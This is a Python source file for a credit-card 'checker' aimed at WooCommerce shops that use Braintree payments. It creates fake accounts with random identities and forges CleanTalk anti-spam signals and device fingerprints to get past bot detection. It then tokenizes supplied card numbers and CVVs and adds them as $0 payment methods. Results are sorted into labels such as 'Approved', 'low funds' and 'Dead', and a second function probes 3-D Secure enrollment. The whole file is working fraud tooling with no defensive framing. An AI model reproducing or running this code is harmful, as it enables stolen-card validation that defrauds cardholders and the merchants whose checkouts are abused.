import uuid, json, urllib, base64, random, string
from httpx import AsyncClient
from utilsdf.functions import (
    random_email,
    random_phone,
    random_street,
    capture,
    clean_text,
)


def generar_uuid():
    return str(uuid.uuid4())


def plug_rnd():
    random_chars = "".join(random.choices(string.ascii_letters + string.digits, k=10))
    random_suffix = "".join(random.choices(string.ascii_letters + string.digits, k=28))
    random_yux = "".join(random.choices(string.ascii_letters + string.digits, k=3))
    return f"{random_chars}::{random_suffix}::{random_yux}"


async def b3_wc(cc, month, year, cvv, url):
    async with AsyncClient(
        follow_redirects=True,
        verify=False,
    ) as session:
        mail = random_email()
        si = generar_uuid()
        street = random_street()
        phone = random_phone()

        r = await session.get(f"https://{url}/my-account/")
        t = r.text
        rn = capture(t, '"woocommerce-register-nonce" value="', '"')

        h2 = {
            "Host": f"{url}",
            "origin": f"https://{url}",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "referer": f"https://{url}/my-account/",
        }

        if "apbct_" in t:
            ap_t = capture(t, '"apbct_timestamp":"', '"')
            ap_u = capture(t, '"apbct_urls":"', '"')
            ap_l = capture(t, '"apbct_site_landing_ts":"', '"')
            ap_c = capture(t, '"apbct_cookies_test":"', '"')
            ap_x = capture(t, '"pixel__url":"', '"')

            ap = {
                "apbct_timestamp": f"{ap_t}",
                "ct_mouse_moved": True,
                "apbct_urls": f"{ap_u}",
                "ct_has_scrolled": True,
                "ct_checked_emails": "0",
                "ct_ps_timestamp": f"{ap_t}",
                "ct_cookies_type": "none",
                "apbct_headless": "false",
                "ct_has_key_up": "true",
                "apbct_page_hits": 1,
                "apbct_visible_fields": {
                    "visible_fields": "email",
                    "visible_fields_count": 1,
                    "invisible_fields": "woocommerce-register-nonce _wp_http_referer apbct_visible_fields ct_no_cookie_hidden_field",
                    "invisible_fields_count": 4,
                },
                "apbct_site_landing_ts": f"{ap_l}",
                "apbct_cookies_test": f"{ap_c}",
                "ct_has_input_focused": "true",
                "ct_fkp_timestamp": f"{ap_t}",
                "ct_pointer_data": "[[322,171,10186],[46,142,14658]]",
                "ct_screen_info": {
                    "fullWidth": 360,
                    "fullHeight": 2698,
                    "visibleWidth": 360,
                    "visibleHeight": 621,
                },
                "ct_checkjs": "1039531153",
                "ct_timezone": "-5",
                "apbct_pixel_url": f"{ap_x}",
                "apbct_session_id": "jmhundgp",
                "apbct_session_current_page": f"https://{url}/my-account/",
                "typo": [],
            }

            ap = json.dumps(ap)
            ap2 = urllib.parse.quote(ap)
            ap3 = base64.b64encode(ap2.encode()).decode("utf-8")

            c = f"eyIwIjp7InZpc2libGVfZmllbGRzIjoiZW1haWwiLCJ2aXNpYmxlX2ZpZWxkc19jb3VudCI6MSwiaW52aXNpYmxlX2ZpZWxkcyI6Indvb2NvbW1lcmNlLXJlZ2lzdGVyLW5vbmNlIF93cF9odHRwX3JlZmVyZXIgY3Rfbm9fY29va2llX2hpZGRlbl9maWVsZCIsImludmlzaWJsZV9maWVsZHNfY291bnQiOjN9fQ%3D%3D&{ap3}"

            p2 = f"email={mail}&password=Sachio900*&woocommerce-register-nonce={rn}&_wp_http_referer=%2Fmy-account%2F&register=Register&{c}"
        else:
            p2 = f"email={mail}&password=Sachio900*&woocommerce-register-nonce={rn}&_wp_http_referer=%2Fmy-account%2F&register=Register"

        r2 = await session.post(
            f"https://{url}/my-account/",
            headers=h2,
            data=p2,
        )
        t2 = r2.text
        msg2 = None

        if "woocommerce-error" in t2:
            msg2 = capture(t2, "<strong>Error:</strong> ", "		</li>")
            if msg2 == None:
                msg2 = capture(
                    t2, "<strong>Error:</strong> <strong>ERROR</strong>: ", " </li>"
                )
            if msg2 != None:
                msg2 = clean_text(msg2)

        h3 = {
            "Host": f"{url}",
            "origin": f"https://{url}",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "referer": f"https://{url}/my-account/edit-address/billing/",
        }

        r3 = await session.get(
            f"https://{url}/my-account/edit-address/billing/",
            headers=h3,
        )
        t3 = r3.text
        an = capture(t3, '"woocommerce-edit-address-nonce" value="', '"')
        url2 = r3.url

        p4 = [
            ("billing_first_name", "Sachio"),
            ("billing_last_name", "YT"),
            ("billing_company", "YT"),
            ("billing_address_1", street),
            ("billing_address_2", ""),
            ("billing_city", "New York"),
            ("billing_state", "NY"),
            ("billing_country", "US"),
            ("billing_postcode", "10027"),
            ("billing_phone", phone),
            ("billing_email", mail),
            ("save_address", "Сохранить+адрес"),
            ("woocommerce-edit-address-nonce", an),
            ("_wp_http_referer", "/my-account/edit-address/billing/"),
            ("action", "edit_address"),
            ("_wc_pv_phone_validator", phone),
        ]

        if "apbct_" in t:
            p4.append(
                (
                    "apbct_visible_fields",
                    "eyIwIjp7InZpc2libGVfZmllbGRzIjoiZW1haWwiLCJ2aXNpYmxlX2ZpZWxkc19jb3VudCI6MSwiaW52aXNpYmxlX2ZpZWxkcyI6Indvb2NvbW1lcmNlLXJlZ2lzdGVyLW5vbmNlIF93cF9odHRwX3JlZmVyZXIgY3Rfbm9fY29va2llX2hpZGRlbl9maWVsZCIsImludmlzaWJsZV9maWVsZHNfY291bnQiOjN9fQ==",
                )
            )
            p4.append(("ct_no_cookie_hidden_field", ap3))

        r4 = await session.post(
            url2,
            headers=h3,
            data=p4,
        )

        r5 = await session.get(
            f"https://{url}/my-account/payment-methods/",
            headers=h3,
        )
        t5 = r5.text
        cn = capture(t5, '"client_token_nonce":"', '"')

        h6 = {
            "Host": f"{url}",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "content-type": "application/x-www-form-urlencoded",
            "origin": f"https://{url}",
            "referer": f"https://{url}/my-account/payment-methods/",
        }

        r6 = await session.get(
            f"https://{url}/my-account/add-payment-method/",
            headers=h6,
        )
        t6 = r6.text
        wn = capture(t6, '"woocommerce-add-payment-method-nonce" value="', '"')

        p7 = f"action=wc_braintree_credit_card_get_client_token&nonce={cn}"

        r7 = await session.post(
            f"https://{url}/wp-admin/admin-ajax.php",
            headers=h6,
            data=p7,
        )
        t7 = r7.text
        ey = capture(t7, '"data":"', '"')
        if ey == None:
            be = ""
            msg2 = "Bearer dd"
        else:
            be_1 = base64.b64decode(ey).decode("utf-8")
            be = capture(be_1, '"authorizationFingerprint":"', '"')

        h8 = {
            "Host": "payments.braintree-api.com",
            "content-type": "application/json",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "authorization": f"Bearer {be}",
            "braintree-version": "2018-05-10",
            "accept": "*/*",
            "origin": "https://assets.braintreegateway.com",
            "referer": "https://assets.braintreegateway.com/",
        }

        p8 = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": f"{si}",
            },
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": f"{cc}",
                        "expirationMonth": f"{month}",
                        "expirationYear": f"{year}",
                        "cvv": f"{cvv}",
                    },
                    "options": {"validate": False},
                }
            },
            "operationName": "TokenizeCreditCard",
        }

        r8 = await session.post(
            "https://payments.braintree-api.com/graphql",
            headers=h8,
            json=p8,
        )
        t8 = r8.text
        tk = capture(t8, '"token":"', '"')
        bc = capture(t8, '"brandCode":"', '"')
        if bc != None:
            bc = bc.lower()

        h9 = {
            "Host": f"{url}",
            "origin": f"https://{url}",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "referer": f"https://{url}/my-account/add-payment-method/",
        }

        if "apbct_" in t:
            p9 = f"payment_method=braintree_credit_card&wc-braintree-credit-card-card-type={bc}&wc-braintree-credit-card-3d-secure-enabled=&wc-braintree-credit-card-3d-secure-verified=&wc-braintree-credit-card-3d-secure-order-total=0.00&wc_braintree_credit_card_payment_nonce={tk}&wc_braintree_device_data=&wc-braintree-credit-card-tokenize-payment-method=true&woocommerce-add-payment-method-nonce={wn}&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1&{c}"
        else:
            p9 = f"payment_method=braintree_credit_card&wc-braintree-credit-card-card-type={bc}&wc-braintree-credit-card-3d-secure-enabled=&wc-braintree-credit-card-3d-secure-verified=&wc-braintree-credit-card-3d-secure-order-total=0.00&wc_braintree_credit_card_payment_nonce={tk}&wc_braintree_device_data=&wc-braintree-credit-card-tokenize-payment-method=true&woocommerce-add-payment-method-nonce={wn}&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1"

        r9 = await session.post(
            f"https://{url}/my-account/add-payment-method/",
            headers=h9,
            data=p9,
        )
        t9 = r9.text
        status_ = capture(t9, "Status code ", ":")
        msg1 = capture(t9, f"Status code {status_}: ", "</li>")
        msg = f"Status code {status_}: {msg1}"

        if "Nice! New payment method added:" in t9:
            status = "Approved! ✅"
            msg = "Success -» $0"
        elif status_ == "avs":
            status = "Approved! ✅ -» avs"
        elif status_ == "2010" or status_ == "cvv" or status_ == "avs_and_cvv":
            status = "Approved! ✅ -» ccn"
        elif status_ == "2001":
            status = "Approved! ✅ -» low funds"
        elif msg2 != None:
            status = "Error! ⚠️"
            msg = msg2
        else:
            status = "Dead! ❌"

        return status, msg


async def b3_vbv(ey, url, price, cc, month, year, cvv):
    async with AsyncClient(
        follow_redirects=True, verify=False, proxies=random_proxy()
    ) as session:
        sessionId = generar_uuid()
        sessionId2 = generar_uuid()
        Fingerprint = "".join(random.choice("0123456789abcdef") for _ in range(32))
        plug = plug_rnd()
        plug2 = plug_rnd()

        be_1 = base64.b64decode(ey).decode("utf-8")
        be = capture(be_1, '"authorizationFingerprint":"', '"')
        me = capture(
            be_1,
            "https://api.braintreegateway.com:443/merchants/",
            "/client_api/v1/configuration",
        )

        h = {
            "Host": "payments.braintree-api.com",
            "content-type": "application/json",
            "authorization": f"Bearer {be}",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "braintree-version": "2018-05-10",
            "accept": "*/*",
            "origin": f"https://{url}",
        }

        p = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": f"{sessionId}",
            },
            "query": "query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       privacyUrl       userAgreementUrl       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment       enrichedCustomerDataEnabled    }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }",
            "operationName": "ClientConfiguration",
        }

        r = await session.post(
            "https://payments.braintree-api.com/graphql",
            headers=h,
            json=p,
        )
        t = r.text
        jt = capture(t, '"cardinalAuthenticationJWT":"', '"')

        h2 = {
            "Host": "payments.braintree-api.com",
            "content-type": "application/json",
            "authorization": f"Bearer {be}",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "braintree-version": "2018-05-10",
            "accept": "*/*",
            "origin": "https://assets.braintreegateway.com",
            "referer": "https://assets.braintreegateway.com/",
        }

        p2 = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "dropin2",
                "sessionId": f"{sessionId}",
            },
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": f"{cc}",
                        "expirationMonth": f"{month}",
                        "expirationYear": f"{year}",
                        "cvv": f"{cvv}",
                        "cardholderName": "Sachio YT",
                        "billingAddress": {"postalCode": "10027"},
                    },
                    "options": {"validate": False},
                }
            },
            "operationName": "TokenizeCreditCard",
        }

        r2 = await session.post(
            "https://payments.braintree-api.com/graphql",
            headers=h2,
            json=p2,
        )
        t2 = r2.text
        tok = capture(t2, '"token":"', '"')
        bin_ = capture(t2, '"bin":"', '"')

        h3 = {
            "Host": "centinelapi.cardinalcommerce.com",
            "content-type": "application/json;charset=UTF-8",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "accept": "*/*",
            "origin": f"https://{url}",
        }

        p3 = {
            "BrowserPayload": {
                "Order": {
                    "OrderDetails": {},
                    "Consumer": {
                        "BillingAddress": {},
                        "ShippingAddress": {},
                        "Account": {},
                    },
                    "Cart": [],
                    "Token": {},
                    "Authorization": {},
                    "Options": {},
                    "CCAExtension": {},
                },
                "SupportsAlternativePayments": {
                    "cca": True,
                    "hostedFields": False,
                    "applepay": False,
                    "discoverwallet": False,
                    "wallet": False,
                    "paypal": False,
                    "visacheckout": False,
                },
            },
            "Client": {"Agent": "SongbirdJS", "Version": "1.35.0"},
            "ConsumerSessionId": None,
            "ServerJWT": f"{jt}",
        }

        r3 = await session.post(
            "https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init",
            headers=h3,
            json=p3,
        )
        t3 = r3.text
        re_ = capture(t3, '"CardinalJWT":"', '"')
        encabezado_base64, carga_util_base64, firma = re_.split(".")
        re_1 = base64.urlsafe_b64decode(
            carga_util_base64 + "=" * (4 - len(carga_util_base64) % 4)
        ).decode("utf-8")
        re = capture(re_1, '"referenceId":"', '",')
        ge = capture(re_1, '"geolocation":"', '"')
        org = capture(re_1, '"orgUnitId":"', '"')

        r4 = await session.get(
            f"https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=True&alias=Default&orgUnitId={org}&tmEventType=PAYMENT&referenceId={re}&geolocation={ge}&origin=Songbird",
        )
        t4 = r4.text
        no = capture(t4, '"nonce":"', '"')

        h5 = {
            "Host": "geo.cardinalcommerce.com",
            "content-type": "application/json",
            "accept": "*/*",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "origin": "https://geo.cardinalcommerce.com",
            "referer": f"https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=True&alias=Default&orgUnitId={org}&tmEventType=PAYMENT&referenceId={re}&geolocation={ge}&origin=Songbird",
        }

        p5 = {
            "Cookies": {"Legacy": True, "LocalStorage": True, "SessionStorage": True},
            "DeviceChannel": "Browser",
            "Extended": {
                "Browser": {
                    "Adblock": True,
                    "AvailableJsFonts": [],
                    "DoNotTrack": "unknown",
                    "JavaEnabled": False,
                },
                "Device": {
                    "ColorDepth": 24,
                    "Cpu": "unknown",
                    "Platform": "Linux armv81",
                    "TouchSupport": {
                        "MaxTouchPoints": 5,
                        "OnTouchStartAvailable": True,
                        "TouchEventCreationSuccessful": True,
                    },
                },
            },
            "Fingerprint": f"{Fingerprint}",
            "FingerprintingTime": 1243,
            "FingerprintDetails": {"Version": "1.5.1"},
            "Language": "es-419",
            "Latitude": None,
            "Longitude": None,
            "OrgUnitId": f"{org}",
            "Origin": "Songbird",
            "Plugins": [f"{plug}", f"{plug2}"],
            "ReferenceId": f"{re}",
            "Referrer": "",
            "Screen": {
                "FakedResolution": False,
                "Ratio": 2.2222222222222223,
                "Resolution": "800x360",
                "UsableResolution": "800x360",
                "CCAScreenSize": "01",
            },
            "CallSignEnabled": None,
            "ThreatMetrixEnabled": False,
            "ThreatMetrixEventType": "PAYMENT",
            "ThreatMetrixAlias": "Default",
            "TimeOffset": 300,
            "UserAgent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "UserAgentDetails": {"FakedOS": False, "FakedBrowser": False},
            "BinSessionId": f"{no}",
        }

        r5 = await session.post(
            "https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData",
            headers=h5,
            json=p5,
        )

        h6 = {
            "Host": "api.braintreegateway.com",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "content-type": "application/json",
            "accept": "*/*",
            "origin": f"https://{url}",
        }

        p6 = {
            "amount": f"{price}",
            "additionalInfo": {
                "acsWindowSize": "03",
                "billingLine1": "118 W 132nd St",
                "billingPostalCode": "KA7 0PR",
                "billingCountryCode": "US",
                "billingPhoneNumber": "19006318646",
                "billingGivenName": "Sachio",
                "billingSurname": "YT",
                "email": "sachiopremiun@gmail.com",
            },
            "bin": f"{bin_}",
            "dfReferenceId": f"{re}",
            "clientMetadata": {
                "requestedThreeDSecureVersion": "2",
                "sdkVersion": "web/3.80.0",
                "cardinalDeviceDataCollectionTimeElapsed": 1354,
                "issuerDeviceDataCollectionTimeElapsed": 4237,
                "issuerDeviceDataCollectionResult": True,
            },
            "authorizationFingerprint": f"{be}",
            "braintreeLibraryVersion": "braintree/web/3.80.0",
            "_meta": {
                "merchantAppId": f"{url}",
                "platform": "web",
                "sdkVersion": "3.80.0",
                "source": "client",
                "integration": "custom",
                "integrationType": "custom",
                "sessionId": f"{sessionId2}",
            },
        }

        r6 = await session.post(
            f"https://api.braintreegateway.com/merchants/{me}/client_api/v1/payment_methods/{tok}/three_d_secure/lookup",
            headers=h6,
            json=p6,
        )
        t6 = r6.text
        nonce = capture(t6, '"nonce":"', '"')
        status = capture(t6, '"status":"', '"')
        enrolled = capture(t6, '"enrolled":"', '"')

        return f"{status} - [{enrolled}]", nonce
